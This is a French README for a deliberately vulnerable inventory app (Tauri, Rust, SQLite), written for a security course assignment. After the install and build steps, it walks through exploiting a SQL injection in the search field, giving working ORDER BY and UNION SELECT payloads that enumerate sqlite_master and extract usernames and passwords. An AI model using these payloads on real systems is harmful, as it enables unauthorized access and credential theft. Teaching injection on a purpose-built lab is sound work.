# App Vulnérable — Injection SQL (Devoir Semaine 4)

Application de gestion d'inventaire (Tauri + Rust + SQLite) construite volontairement
avec une faille d'injection SQL dans le champ de recherche, à des fins pédagogiques.

## Prérequis à installer

| Outil | Version recommandée | Lien |
|---|---|---|
| Rust (rustc + cargo) | dernière stable | https://www.rust-lang.org/tools/install |
| Node.js | LTS (18+) | https://nodejs.org/ |
| npm | inclus avec Node.js | — |
| Tauri CLI | dernière | installé via cargo ou npm (voir plus bas) |

### Windows uniquement

Tauri nécessite les outils de build C++ :
- Installer **Microsoft C++ Build Tools** : https://visualstudio.microsoft.com/visual-cpp-build-tools/
- WebView2 est généralement déjà présent sur Windows 10/11 (sinon : https://developer.microsoft.com/microsoft-edge/webview2/)

## Installation

Depuis la racine du projet :

```bash
# Installer les dépendances frontend
npm install

# Installer la CLI Tauri (si pas déjà fait)
npm install -D @tauri-apps/cli
```

## Lancer l'application en mode développement

```bash
npm run tauri dev
```


## Build de production (optionnel)

```bash
npm run tauri build
```

L'exécutable sera généré dans `src-tauri/target/release/`.

---

## Étapes pour exploiter la faille d'injection SQL

Le champ **"Rechercher un produit..."** est vulnérable : le terme de recherche est
concaténé directement dans la requête SQL (`format!()`) sans requête préparée,
côté `commandes.rs` (`rechercher_produits_raw`).

oller chaque payload d'un coup dans le champ de recherche (pas taper lettre par
lettre), sinon des erreurs de syntaxe SQL intermédiaires vont apparaître dans la
console pendant que tu tapes — c'est normal et sans conséquence.

### Étape 1 — Trouver le nombre de colonnes

Avec `ORDER BY`, en augmentant le chiffre jusqu'à obtenir une erreur :

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--
' ORDER BY 5--
' ORDER BY 6--   ← plante ici → il y a 5 colonnes
```

### Étape 2 — Lister les tables de la base de données

SQLite garde le schéma dans la table système `sqlite_master`
(colonnes : `type`, `name`, `tbl_name`, `rootpage`, `sql` — pas de colonne `id`,
donc on utilise `rowid`) :

```
' UNION SELECT rowid, name, type, 0, 0 FROM sqlite_master--
```

Résultat attendu dans la colonne "Produit" : `produits`, `users`, etc.

### Étape 3 — Trouver les noms de colonnes d'une table (ex. `users`)

```
' UNION SELECT rowid, sql, type, 0, 0 FROM sqlite_master WHERE name='users'--
```

Résultat attendu : le texte complet du `CREATE TABLE users (id INTEGER PRIMARY KEY
AUTOINCREMENT, username TEXT NOT NULL, password TEXT NOT NULL, role TEXT NOT NULL)`.

### Étape 4 — Extraire les utilisateurs et mots de passe

```
' UNION SELECT id, username, password, role, 0 FROM users--
```

Résultat attendu, affiché directement dans le tableau produits :

| Colonne affichée | Contenu réel |
|---|---|
| Produit | `username` |
| Catégorie | `password` |
| Prix | `role` |
| Quantité | `0` |

---